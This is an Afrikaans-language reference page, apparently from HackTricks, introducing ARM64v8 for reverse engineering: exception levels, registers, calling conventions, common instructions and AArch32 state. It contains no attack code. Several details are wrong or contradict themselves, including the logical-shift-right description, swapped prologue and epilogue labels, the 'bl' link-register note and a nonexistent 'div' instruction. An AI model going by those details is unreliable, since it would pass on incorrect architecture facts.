# Inleiding tot ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Uitsonderingsvlakke - EL (ARM64v8)**

In die ARMv8-argitektuur definieer uitvoeringsvlakke, bekend as Exception Levels (ELs), die voorregvlak en vermoëns van die uitvoeringsomgewing. Daar is vier uitsonderingsvlakke, wat wissel van EL0 tot EL3, elk met 'n verskillende doel:

1. **EL0 - User Mode**:
- Dit is die minste-bevoorregte vlak en word gebruik vir die uitvoering van gewone toepassingskode.
- Toepassings wat by EL0 loop, is van mekaar en van die stelselprogrammatuur geïsoleer wat sekuriteit en stabiliteit verbeter.
2. **EL1 - Operating System Kernel Mode**:
- Die meeste bedryfstelsel-kernels loop op hierdie vlak.
- EL1 het meer voorregte as EL0 en kan stelselbronne benader, maar met sekere beperkings om stelselintegriteit te verseker. Jy gaan van EL0 na EL1 met die `SVC` instruksie.
3. **EL2 - Hypervisor Mode**:
- Hierdie vlak word vir virtualisering gebruik. 'n Hypervisor wat by EL2 loop kan verskeie bedryfstelsels bestuur (elkeen in sy eie EL1) wat op dieselfde fisiese hardeware loop.
- EL2 verskaf funksies vir isolasie en beheer van die gevirtualiseerde omgewings.
- Virtuele masjien-toepassings soos Parallels kan die `hypervisor.framework` gebruik om met EL2 te kommunikeer en virtuele masjiene te laat loop sonder om kernel-uitbreidings te benodig.
- Om van EL1 na EL2 te beweeg word die `HVC` instruksie gebruik.
4. **EL3 - Secure Monitor Mode**:
- Dit is die mees bevoorregte vlak en word dikwels gebruik vir veilige opstart en vertroude uitvoeringsomgewings.
- EL3 kan toegang tussen veilige en nie-veilige toestande bestuur en beheer (soos secure boot, trusted OS, ens.).
- Dit is gebruik vir KPP (Kernel Patch Protection) in macOS, maar dit word nie meer gebruik nie.
- EL3 word nie meer deur Apple gebruik nie.
- Die oorgang na EL3 word tipies gedoen deur die `SMC` (Secure Monitor Call) instruksie.

Die gebruik van hierdie vlakke laat 'n gestruktureerde en veilige manier toe om verskillende aspekte van die stelsel te bestuur, van gebruikersprogramme tot die mees bevoorregte stelselprogrammatuur. ARMv8 se benadering tot voorregvlakke help om verskillende stelselkomponente effektief te isoleer, wat die sekuriteit en robuustheid van die stelsel verbeter.

## **Registers (ARM64v8)**

ARM64 het **31 algemene-doel registers**, gemerk `x0` tot `x30`. Elk kan 'n **64-bit** (8-byt) waarde stoor. Vir operasies wat slegs 32-bit waardes vereis, kan dieselfde registers in 'n 32-bit modus benader word deur die name `w0` tot `w30` te gebruik.

1. **`x0`** tot **`x7`** - Hierdie word tipies as scratch-registers en vir die oordrag van parameters na subrutines gebruik.
- **`x0`** dra ook die terugkeerdata van 'n funksie.
2. **`x8`** - In die Linux-kern word `x8` as die stelseloproepnommer vir die `svc` instruksie gebruik. **In macOS is die x16 die een wat gebruik word!**
3. **`x9`** tot **`x15`** - Meer tydelike registers, dikwels vir plaaslike veranderlikes gebruik.
4. **`x16`** en **`x17`** - **Intra-procedural Call Registers**. Tydelike registers vir direkte waardes. Hulle word ook vir indirekte funksie-oproepe en PLT (Procedure Linkage Table) stubs gebruik.
- **`x16`** word gebruik as die **stelseloproepnommer** vir die **`svc`** instruksie in **macOS**.
5. **`x18`** - **Platform register**. Dit kan as 'n algemene-doel register gebruik word, maar op sommige platforms is hierdie register gereserveer vir platform-spesifieke gebruike: Pointer na die huidige thread environment block in Windows, of om na die tans **uitvoerende task structure in linux kernel** te wys.
6. **`x19`** tot **`x28`** - Hierdie is callee-saved registers. 'n Funksie moet die waardes van hierdie registers vir sy caller bewaar, dus word hulle in die stapel gestoor en herstel voordat dit terugkeer na die caller.
7. **`x29`** - **Frame pointer** om die stapelraam te volg. Wanneer 'n nuwe stapelraam geskep word omdat 'n funksie aangeroep is, word die **`x29`** register **op die stapel gestoor** en die **nuwe** raamwyseradres (die **`sp`** adres) in hierdie register gestoor.
- Hierdie register kan ook as 'n **algemene-doel register** gebruik word alhoewel dit gewoonlik as verwysing na **plaaslike veranderlikes** gebruik word.
8. **`x30`** of **`lr`** - **Link register**. Dit hou die **terugkeeradres** wanneer 'n `BL` (Branch with Link) of `BLR` (Branch with Link to Register) instruksie uitgevoer word deur die **`pc`** waarde in hierdie register te stoor.
- Dit kan ook soos enige ander register gebruik word.
- As die huidige funksie 'n nuwe funksie gaan aanroep en dus `lr` oorbeskryf, sal dit dit aan die begin in die stapel stoor; dit is die epiloog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Stoor `fp` en `lr`, genereer spasie en kry nuwe `fp`) en herstel dit aan die einde, dit is die proloog (`ldp x29, x30, [sp], #48; ret` -> Herstel `fp` en `lr` en keer terug).
9. **`sp`** - **Stack pointer**, gebruik om die top van die stapel by te hou.
- Die **`sp`** waarde moet altyd ten minste 'n **quadword** **uitlynings** hê, anders kan 'n uitlijningsuitzondering voorkom.
10. **`pc`** - **Program counter**, wat na die volgende instruksie wys. Hierdie register kan slegs deur die generering van uitzonderings, uitzonderingsterugkeere en takke geüpdate word. Die enigste gewone instruksies wat hierdie register kan lees is branch with link-instruksies (BL, BLR) wat die **`pc`** adres in **`lr`** stoor (Link Register).
11. **`xzr`** - **Zero register**. Ook genoem **`wzr`** in sy **32**-bit registervorm. Kan gebruik word om maklik die nulwaarde te kry (algemene operasie) of om vergelykings uit te voer met **`subs`** soos **`subs XZR, Xn, #10`** wat die resulterende data nêrens stoor (in **`xzr`**).

Die **`Wn`** registers is die **32bit** weergawe van die **`Xn`** register.

> [!TIP]
> Die registers van X0 - X18 is vlugtig (volatile), wat beteken dat hul waardes deur funksie-oproepe en onderbrekings verander kan word. Die registers van X19 - X28 is egter nie-vlugtig, wat beteken hul waardes moet oor funksie-oproepe bewaar word ("callee saved").

### SIMD en Dryfpunt-registers

Boonop is daar nog **32 registers van 128bit lengte** wat in geoptimaliseerde single instruction multiple data (SIMD) operasies en vir dryfpuntaritmetika gebruik kan word. Hierdie word die Vn registers genoem alhoewel hulle ook in **64**-bit, **32**-bit, **16**-bit en **8**-bit kan werk en dan word hulle **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** en **`Bn`** genoem.

### Stelselregisters

**Daar is honderde stelselregisters**, ook genoem special-purpose registers (SPRs), wat gebruik word vir **monitoring** en **beheer** van die **verwerker** se gedrag.\
Hulle kan slegs gelees of gestel word met die toegewyde spesiale instruksies **`mrs`** en **`msr`**.

Die spesiale registers **`TPIDR_EL0`** en **`TPIDDR_EL0`** word algemeen aangetref by omgekeerde ingenieurswese. Die `EL0` agtervoegsel dui die **minimum uitsondering** vanwaar die register aangespreek kan word (in hierdie geval is EL0 die gewone uitsonderings (voorreg) vlak waarop gewone programme loop).\
Hulle word dikwels gebruik om die **basisadres van die thread-local storage** geheuegebied te stoor. Gewoonlik is die eerste een lees- en skryfbaar vir programme wat in EL0 loop, maar die tweede kan van EL0 gelees en van EL1 geskryf word (soos die kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** bevat verskeie proseskomponente geserialiseer in die bedryfstelsel-sigbare **`SPSR_ELx`** spesiale register, waar X die **toestemmings** **vlak van die getriggerde** uitsondering is (dit maak dit moontlik om die prosesstaat te herstel wanneer die uitsondering eindig).\
Hierdie is die toeganklike velde:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Die **`N`**, **`Z`**, **`C`** en **`V`** kondisievlae:
- **`N`** beteken die operasie het 'n negatiewe resultaat opgelewer
- **`Z`** beteken die operasie het nul opgelewer
- **`C`** beteken die operasie het 'n carry gehad
- **`V`** beteken die operasie het 'n signed overflow opgelewer:
- Die som van twee positiewe getalle lewer 'n negatiewe resultaat.
- Die som van twee negatiewe getalle lewer 'n positiewe resultaat.
- By aftrekking, wanneer 'n groot negatiewe getal van 'n kleiner positiewe getal afgetrek word (of omgekeerd), en die resultaat nie binne die gegewe bitgrootte se reeks verteenwoordig kan word nie.
- Oënskynlik weet die verwerker nie of die operasie signed is of nie, so dit sal C en V in die operasies nagaan en aandui of 'n carry voorgekom het in geval dit signed of unsigned was.

> [!WARNING]
> Nie al die instruksies werk hierdie vlae by nie. Sommige soos **`CMP`** of **`TST`** doen dit wel, en ander wat 'n s agtervoegsel het soos **`ADDS`** doen dit ook.

- Die huidige **registerwydte (`nRW`) vlag**: As die vlag die waarde 0 hou, sal die program in die AArch64-uitvoeringsstaat loop wanneer dit hervat word.
- Die huidige **Exception Level** (**`EL`**): 'n Gereelde program wat in EL0 loop sal die waarde 0 hê.
- Die **single stepping** vlag (**`SS`**): Gebruik deur debuggers om enkelstelling uit te voer deur die SS-vlag op 1 te stel binne **`SPSR_ELx`** deur 'n uitsondering. Die program sal 'n stap uitvoer en 'n single step-uitsondering genereer.
- Die **onwettige uitsonderings** toestand-vlag (**`IL`**): Dit word gebruik om te merk wanneer 'n bevoorregte sagteware 'n ongeldige uitsonderingsvlak-oordrag uitvoer; hierdie vlag word op 1 gestel en die verwerker genereer 'n illegal state exception.
- Die **`DAIF`** vlae: Hierdie vlae laat 'n bevoorregte program toe om sekere eksterne uitzonderings selektief te mask.
- As **`A`** 1 is beteken dit **asynchronous aborts** sal geaktiveer word. Die **`I`** konfigureer om op eksterne hardeware **Interrupt Requests** (IRQs) te reageer. en die F is verwant aan **Fast Interrupt Requests** (FIRs).
- Die **stack pointer select** vlae (**`SPS`**): Bevoorregte programme wat in EL1 en hoër loop kan wissel tussen die gebruik van hul eie stack pointer register en die user-model een (bv. tussen `SP_EL1` en `EL0`). Hierdie omskakeling word uitgevoer deur na die **`SPSel`** spesiale register te skryf. Dit kan nie vanaf EL0 gedoen word nie.

## **Calling Convention (ARM64v8)**

Die ARM64 calling convention spesifiseer dat die **eerste agt parameters** aan 'n funksie in registers **`x0` deur `x7`** gedeel word. **Addisionele** parameters word op die **stapel** deurgegee. Die **terugkeer** waarde word teruggegee in register **`x0`**, of ook in **`x1`** as dit 128 bits lank is. Die **`x19`** tot **`x30`** en **`sp`** registers moet oor funksie-oproepe **behou** word.

Wanneer jy 'n funksie in assembly lees, kyk vir die **funksie proloog en epiloog**. Die **proloog** behels gewoonlik **die stoor van die frame pointer (`x29`)**, **opstel** van 'n **nuwe frame pointer**, en **toewysing van stapelspasie**. Die **epiloog** behels gewoonlik **herstel van die gestoor frame pointer** en **terugkeer** uit die funksie.

### Calling Convention in Swift

Swift het sy eie **calling convention** wat gevind kan word by [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Algemene Instruksies (ARM64v8)**

ARM64-instruksies het gewoonlik die **formaat `opcode dst, src1, src2`**, waar **`opcode`** die **operasie** is wat uitgevoer sal word (soos `add`, `sub`, `mov`, ens.), **`dst`** die **bestemming** register is waar die resultaat gestoor sal word, en **`src1`** en **`src2`** die **bron** registers is. Immediate waardes kan ook in plaas van bronregisters gebruik word.

- **`mov`**: **Skuif** 'n waarde van een **register** na 'n ander.
- Voorbeeld: `mov x0, x1` — Dit skuif die waarde van `x1` na `x0`.
- **`ldr`**: **Laai** 'n waarde van **geheue** in 'n **register**.
- Voorbeeld: `ldr x0, [x1]` — Dit laai 'n waarde vanaf die geheue-adres wat deur `x1` aangedui word in `x0`.
- **Offset mode**: 'n Offset wat die oorspronklike pointer beïnvloed word aangedui, byvoorbeeld:
- `ldr x2, [x1, #8]`, dit sal in x2 die waarde van x1 + 8 laai
- `ldr x2, [x0, x1, lsl #2]`, dit sal in x2 'n objek uit die array x0 laai, vanaf die posisie x1 (indeks) * 4
- **Pre-indexed mode**: Dit sal berekeninge op die oorsprong toepas, die resultaat kry en ook die nuwe oorsprong in die oorsprong stoor.
- `ldr x2, [x1, #8]!`, dit sal `x1 + 8` in `x2` laai en in x1 die resultaat van `x1 + 8` stoor
- `str lr, [sp, #-4]!`, Stoor die link register in sp en werk die register sp op
- **Post-index mode**: Dit is soos die vorige maar die geheueadres word eers aangespreek en dan die offset bereken en gestoor.
- `ldr x0, [x1], #8`, laai `x1` in `x0` en werk x1 by met `x1 + 8`
- **PC-relative addressing**: In hierdie geval word die adres wat gelaai moet word relatief tot die PC-register bereken
- `ldr x1, =_start`, Dit sal die adres waar die `_start` simbool begin in x1 laai verwant aan die huidige PC.
- **`str`**: **Stoor** 'n waarde van 'n **register** in **geheue**.
- Voorbeeld: `str x0, [x1]` — Dit stoor die waarde in `x0` by die geheue-ligging wat deur `x1` aangedui word.
- **`ldp`**: **Load Pair of Registers**. Hierdie instruksie **laai twee registers** van **opeenvolgende geheue** liggings. Die geheueadres word tipies gevorm deur 'n offset by te voeg tot die waarde in 'n ander register.
- Voorbeeld: `ldp x0, x1, [x2]` — Dit laai `x0` en `x1` vanaf die geheue-ligginge by `x2` en `x2 + 8`, onderskeidelik.
- **`stp`**: **Store Pair of Registers**. Hierdie instruksie **stoor twee registers** na **opeenvolgende geheue** liggings. Die geheueadres word tipies gevorm deur 'n offset by te voeg tot die waarde in 'n ander register.
- Voorbeeld: `stp x0, x1, [sp]` — Dit stoor `x0` en `x1` na die geheue-ligginge by `sp` en `sp + 8`, onderskeidelik.
- `stp x0, x1, [sp, #16]!` — Dit stoor `x0` en `x1` na die geheue-ligginge by `sp+16` en `sp + 24`, onderskeidelik, en werk `sp` by na `sp+16`.
- **`add`**: **Tel** die waardes van twee registers by en stoor die resultaat in 'n register.
- Sintaks: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Bestemming
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register of immediate)
- \[shift #N | RRX] -> Voer 'n skuif of RRX uit
- Voorbeeld: `add x0, x1, x2` — Dit tel die waardes in `x1` en `x2` bymekaar en stoor die resultaat in `x0`.
- `add x5, x5, #1, lsl #12` — Dit is gelyk aan 4096 (ʼn 1 geskuiw 12 keer) -> 1 0000 0000 0000 0000
- **`adds`**: Hierdie voer 'n `add` uit en werk die vlae by
- **`sub`**: **Trek af** die waardes van twee registers en stoor die resultaat in 'n register.
- Kyk **`add`** **sintaks**.
- Voorbeeld: `sub x0, x1, x2` — Dit trek die waarde in `x2` af van `x1` en stoor die resultaat in `x0`.
- **`subs`**: Dit is soos `sub` maar werk die vlae by.
- **`mul`**: **Vermenigvuldig** die waardes van **twee registers** en stoor die resultaat in 'n register.
- Voorbeeld: `mul x0, x1, x2` — Dit vermenigvuldig die waardes in `x1` en `x2` en stoor die resultaat in `x0`.
- **`div`**: **Verdeel** die waarde van een register deur 'n ander en stoor die resultaat in 'n register.
- Voorbeeld: `div x0, x1, x2` — Dit deel die waarde in `x1` deur `x2` en stoor die resultaat in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Voeg 0's aan die einde by en skuif die ander boodskappe vorentoe (vermenigvuldig met n-keer 2)
- **Logical shift right**: Voeg 1's aan die begin by en skuif die ander boodskappe agtertoe (deel met n-keer 2 in unsigned)
- **Arithmetic shift right**: Soos **`lsr`**, maar in plaas daarvan om 0's by te voeg as die mees betekenisvolle bit 'n 1 is, word **1's bygevoeg** (deel met n-keer 2 in signed)
- **Rotate right**: Soos **`lsr`** maar wat ookal van die regterkant verwyder word, word aan die linkerkant aangeheg
- **Rotate Right with Extend**: Soos **`ror`**, maar met die carry-vlag as die "mees betekenisvolle bit". Dus word die carry-vlag na bit 31 verskuif en die verwyderde bit na die carry-vlag.
- **`bfm`**: **Bit Filed Move**, hierdie operasies **kopieer bits `0...n`** uit 'n waarde en plaas hulle in posisies **`m..m+n`**. Die **`#s`** spesifiseer die **linkerste bit** posisie en **`#r`** die **rotate right hoeveelheid**.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopieer 'n bitveld uit 'n register en kopieer dit na 'n ander register.
- **`BFI X1, X2, #3, #4`** Voeg 4 bits van X2 in vanaf die 3de bit van X1
- **`BFXIL X1, X2, #3, #4`** Haal 4 bits vanaf die 3de bit van X2 uit en kopieer dit na X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extend 4 bits van X2 en voeg dit in X1 begin by bitposisie 3 en nullifiseer die regterbits
- **`SBFX X1, X2, #3, #4`** Haal 4 bits wat by bit 3 begin van X2 uit, sign-extend dit, en plaas die resultaat in X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extend 4 bits van X2 en voeg dit in X1 begin by bitposisie 3 en nullifiseer die regterbits
- **`UBFX X1, X2, #3, #4`** Haal 4 bits wat by bit 3 begin van X2 uit en plaas die zero-extended resultaat in X1.
- **Sign Extend To X:** Brei die teken uit (of voeg net 0's by in die unsigned weergawe) van 'n waarde om operasies daarmee te kan uitvoer:
- **`SXTB X1, W2`** Brei die teken van 'n byte **van W2 na X1** uit (`W2` is die helfte van `X2`) om die 64bits te vul
- **`SXTH X1, W2`** Brei die teken van 'n 16bit getal **van W2 na X1** uit om die 64bits te vul
- **`SXTW X1, W2`** Brei die teken van 'n byte **van W2 na X1** uit om die 64bits te vul
- **`UXTB X1, W2`** Voeg 0's (unsigned) by aan 'n byte **van W2 na X1** om die 64bits te vul
- **`extr`:** Haal bits uit 'n gespesifiseerde **paar registers wat gekonkateneer is**.
- Voorbeeld: `EXTR W3, W2, W1, #3` Dit sal **W1+W2** konkateneer en kry **van bit 3 van W2 tot bit 3 van W1** en dit in W3 stoor.
- **`cmp`**: **Vergelyk** twee registers en stel kondisievlae. Dit is 'n **alias van `subs`** wat die bestemmingregister op die nulregister stel. Nuttig om te weet of `m == n`.
- Dit ondersteun dieselfde sintaks as `subs`
- Voorbeeld: `cmp x0, x1` — Dit vergelyk die waardes in `x0` en `x1` en stel die kondisievlae ooreenkomstig.
- **`cmn`**: **Vergelyk negatiewe** operand. In hierdie geval is dit 'n **alias van `adds`** en ondersteun dieselfde sintaks. Nuttig om te weet of `m == -n`.
- **`ccmp`**: Voorwaardelike vergelyking, dit is 'n vergelyking wat slegs uitgevoer sal word as 'n vorige vergelyking waar was en sal spesifiek nzcv bits stel.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> as x1 != x2 en x3 < x4, spring na func
- Dit is omdat **`ccmp`** slegs uitgevoer sal word as die **vorige `cmp` 'n `NE`** was, as dit nie was nie sal die bits `nzcv` op 0 gestel word (wat nie die `blt` vergelyking sal bevredig nie).
- Dit kan ook as `ccmn` gebruik word (dieselfde maar negatief, soos `cmp` vs `cmn`).
- **`tst`**: Dit kontroleer of enige van die waardes in die vergelyking albei 1 is (dit werk soos 'n ANDS sonder om die resultaat enige plek te stoor). Dit is nuttig om 'n register teen 'n waarde te toets en te kyk of enige van die bits in die register aangedui in die waarde 1 is.
- Voorbeeld: `tst X1, #7` Kyk of enige van die laaste 3 bits van X1 1 is
- **`teq`**: XOR operasie en gooi die resultaat weg
- **`b`**: Onvoorwaardelike tak
- Voorbeeld: `b myFunction`
- Let wel dat dit nie die link register met die terugkeeradres vul nie (nie geskik vir subrutine-oproepe wat moet terugkeer nie)
- **`bl`**: **Branch** met link, gebruik om 'n **subrutine te roep**. Stoor die **terugkeeradres in `x30`**.
- Voorbeeld: `bl myFunction` — Dit roep die funksie `myFunction` aan en stoor die terugkeeradres in `x30`.
- Let wel dat dit nie die link register met die terugkeeradres vul nie (nie geskik vir subrutine-oproepe wat moet terugkeer nie)
- **`blr`**: **Branch** met Link na Register, gebruik om 'n **subrutine te roep** waar die teiken in 'n **register** gespesifiseer is. Stoor die terugkeeradres in `x30`. (Dit is
- Voorbeeld: `blr x1` — Dit roep die funksie aan waarvan die adres in `x1` is en stoor die terugkeeradres in `x30`.
- **`ret`**: **Keer terug** van 'n **subrutine**, tipies deur die adres in **`x30`** te gebruik.
- Voorbeeld: `ret` — Dit keer terug van die huidige subrutine met die terugkeeradres in `x30`.
- **`b.<cond>`**: Voorwaardelike takkies
- **`b.eq`**: **Tak as gelyk**, gebaseer op die vorige `cmp` instruksie.
- Voorbeeld: `b.eq label` — As die vorige `cmp` instruksie twee gelyke waardes gevind het, spring dit na `label`.
- **`b.ne`**: **Tak as Nie Gelyk Nie**. Hierdie instruksie kontroleer die kondisievlae (wat deur 'n vorige vergelykingsinstruksie gestel is), en as die vergelykte waardes nie gelyk was nie, tak dit na 'n label of adres.
- Voorbeeld: Na 'n `cmp x0, x1` instruksie, `b.ne label` — As die waardes in `x0` en `x1` nie gelyk was nie, spring dit na `label`.
- **`cbz`**: **Vergelyk en Tak op Nul**. Hierdie instruksie vergelyk 'n register met nul, en as dit gelyk is, tak dit na 'n label of adres.
- Voorbeeld: `cbz x0, label` — As die waarde in `x0` nul is, spring dit na `label`.
- **`cbnz`**: **Vergelyk en Tak op Nie-Nul**. Hierdie instruksie vergelyk 'n register met nul, en as dit nie gelyk is nie, tak dit na 'n label of adres.
- Voorbeeld: `cbnz x0, label` — As die waarde in `x0` nie nul is nie, spring dit na `label`.
- **`tbnz`**: Toets bit en tak op nie-nul
- Voorbeeld: `tbnz x0, #8, label`
- **`tbz`**: Toets bit en tak op nul
- Voorbeeld: `tbz x0, #8, label`
- **Voorwaardelike select-operasies**: Dit is operasies waarvan die gedrag afhang van die kondisievlae.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> As waar, X0 = X1, as vals, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as vals, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> As waar, Xd = Xn + 1, as vals, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as vals, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> As waar, Xd = NOT(Xn), as vals, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> As waar, Xd = Xn, as vals, Xd = - Xm
- `cneg Xd, Xn, cond` -> As waar, Xd = - Xn, as vals, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> As waar, Xd = 1, as vals, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> As waar, Xd = \<all 1>, as vals, Xd = 0
- **`adrp`**: Bereken die **bladsyadres van 'n simbool** en stoor dit in 'n register.
- Voorbeeld: `adrp x0, symbol` — Dit bereken die bladsyadres van `symbol` en stoor dit in `x0`.
- **`ldrsw`**: **Laai** 'n signed **32-bit** waarde vanaf geheue en **sign-extend dit na 64** bits. Dit word vir algemene SWITCH-gevalle gebruik.
- Voorbeeld: `ldrsw x0, [x1]` — Dit laai 'n signed 32-bit waarde vanaf die geheue-adres wat deur `x1` aangedui word, sign-extend dit na 64 bits, en stoor dit in `x0`.
- **`stur`**: **Stoor 'n registerwaarde na 'n geheue-ligging**, met gebruik van 'n offset vanaf 'n ander register.
- Voorbeeld: `stur x0, [x1, #4]` — Dit stoor die waarde in `x0` in die geheue-adres wat 4 bytes groter is as die adres wat tans in `x1` is.
- **`svc`** : Maak 'n **stelseloproep**. Dit staan vir "Supervisor Call". Wanneer die verwerker hierdie instruksie uitvoer, **skakel dit van user mode na kernel mode** en spring na 'n spesifieke ligging in geheue waar die **kernel se stelseloproep-hanteringskode** geleë is.

- Voorbeeld:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Funksie Proloog**

1. **Stoor die link register en frame pointer op die stapel**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Stel die nuwe frame-aanwyser op**: `mov x29, sp` (stel die nuwe frame-aanwyser vir die huidige funksie op)
3. **Allokeer ruimte op die stapel vir lokale veranderlikes** (indien nodig): `sub sp, sp, <size>` (waar `<size>` die aantal vereiste bytes is)

### **Funksie Epiloog**

1. **Dealloceer lokale veranderlikes (indien toegeken)**: `add sp, sp, <size>`
2. **Herstel die link-register en frame-aanwyser**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (gee beheer terug aan die oproeper deur die adres in die link register te gebruik)

## ARM Algemene geheue-beskerming

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Uitvoeringstoestand

Armv8-A ondersteun die uitvoering van 32-bit programme. **AArch32** kan in een van **twee instruksiesetse** loop: **`A32`** en **`T32`** en kan tussen hulle wissel via **`interworking`**.\
**Bevoorregte** 64-bit programme kan die **uitvoering van 32-bit** programme skeduleer deur 'n exception level-oordrag na die laer bevoorregte 32-bit uit te voer.\
Let daarop dat die oorgang van 64-bit na 32-bit plaasvind met 'n laer exception level (byvoorbeeld 'n 64-bit program in EL1 wat 'n program in EL0 uitlok). Dit word gedoen deur die **bit 4 van** die spesiale register **`SPSR_ELx`** **op 1 te stel** wanneer die `AArch32` prosesdraad gereed is om uitgevoer te word en die res van `SPSR_ELx` die CPSR van die **`AArch32`** program stoor. Daarna roep die bevoorregte proses die **`ERET`** instruksie sodat die verwerker na **`AArch32`** oorgaan en in A32 of T32 ingaan afhangend van CPSR.

Die **`interworking`** gebeur deur die J- en T-bitte van CPSR te gebruik. `J=0` en `T=0` beteken **`A32`** en `J=0` en `T=1` beteken **T32**. Dit beteken basies dat die **laagste bit op 1 gestel** word om aan te dui dat die instruksieset T32 is.\
Dit word tydens die **interworking branch instructions,** gestel, maar kan ook direk met ander instruksies gestel word wanneer die PC as die bestemmingsregister gestel word. Voorbeeld:

Nog 'n voorbeeld:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registere

Daar is 16 32-bit registere (r0-r15). **Van r0 tot r14** kan hulle gebruik word vir **enige bewerking**, maar sommige van hulle is gewoonlik gereserveer:

- **`r15`**: programteller (altyd). Bevat die adres van die volgende instruksie. In A32 huidige + 8, in T32, huidige + 4.
- **`r11`**: Raam-aanwyser
- **`r12`**: Intra-prosedurele oproepregister
- **`r13`**: Stakaanwyser (Let op die stak is altyd 16-byte uitgelinieer)
- **`r14`**: Skakelregister

Verder word registere gestoor in **`banked registries`**. Dit is plekke wat die registerwaardes stoor en toelaat om vinnige kontekswisseling in uitsonderingshantering en bevoorregte operasies uit te voer, sodat dit nie elke keer nodig is om registere handmatig te bewaar en te herstel nie.\
Dit word gedoen deur die verwerkerstatus van die `CPSR` na die `SPSR` van die verwerkermodus waarin die uitsondering geneem word te stoor. By die terugkeer van die uitsondering word die **`CPSR`** herstel vanaf die **`SPSR`**.

### CPSR - Huidige Programstatusregister

In AArch32 werk die CPSR soortgelyk aan **`PSTATE`** in AArch64 en word ook gestoor in **`SPSR_ELx`** wanneer 'n uitsondering geneem word om later die uitvoering te herstel:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Die velde is in 'n paar groepe verdeel:

- Toepassingsprogramstatusregister (APSR): aritmetiese vlae en toeganklik vanaf EL0
- Uitvoeringsstaatregisters: prosesgedrag (beheerd deur die OS).

#### Toepassingsprogramstatusregister (APSR)

- Die **`N`**, **`Z`**, **`C`**, **`V`** vlae (net soos in AArch64)
- Die **`Q`** vlag: Dit word op 1 gestel wanneer **heelgetal-saturasie plaasvind** tydens die uitvoering van 'n gespesialiseerde saturerende aritmetiese instruksie. Sodra dit op **`1`** gestel is, behou dit die waarde totdat dit handmatig op 0 gestel word. Verder is daar geen instruksie wat sy waarde implisiet kontroleer nie; dit moet deur dit manueel te lees gedoen word.
- **`GE`** (Greater than or equal) vlae: Dit word gebruik in SIMD (Single Instruction, Multiple Data) operasies, soos "parallel add" en "parallel subtract". Hierdie operasies laat toe om meerdere datapunte in 'n enkele instruksie te verwerk.

Byvoorbeeld, die **`UADD8`** instruksie **tel vier pare van bytes op** (van twee 32-bit operandes) parallel en stoor die resultate in 'n 32-bit register. Dit stel dan die `GE` vlae in die `APSR` gebaseer op hierdie resultate. Elke GE-vlag korrespondeer met een van die byte-optelings en dui aan of die optelling vir daardie byte-paar oorloop het.

Die **`SEL`** instruksie gebruik hierdie GE-vlae om voorwaardelike aksies uit te voer.

#### Uitvoeringsstaatregisters

- Die **`J`**- en **`T`**-bisse: **`J`** behoort 0 te wees en as **`T`** 0 is, word die instruksieset A32 gebruik; as dit 1 is, word T32 gebruik.
- **IT Block State Register** (`ITSTATE`): Dit is die bisse van 10-15 en 25-26. Hulle stoor voorwaardes vir instruksies binne 'n **`IT`**-voorvoegselgroep.
- Die **`E`**-bit: Dui die **endianness** aan.
- Mode- en Uitsonderingsmasker-bisse (0-4): Hulle bepaal die huidige uitvoerstaat. Die **5de** dui aan of die program as 32-bit (1) of 64-bit (0) loop. Die ander 4 verteenwoordig die **uitsonderingsmodus wat tans gebruik word** (wanneer 'n uitsondering voorkom en dit afgehandel word). Die ingestelde nommer **dui die huidige prioriteit aan** ingeval 'n ander uitsondering getrigger word terwyl dit afgehandel word.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Sekere uitsonderings kan gedeaktiveer word deur die bits **`A`**, `I`, `F`. As **`A`** 1 is beteken dit **asynchrone aborts** sal getrigger word. Die **`I`** stel in om op eksterne hardeware **Interrupt Requests** (IRQs) te reageer, en die **`F`** is verwant aan **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Kyk na [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) of voer `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` uit. BSD syscalls sal **x16 > 0** hê.

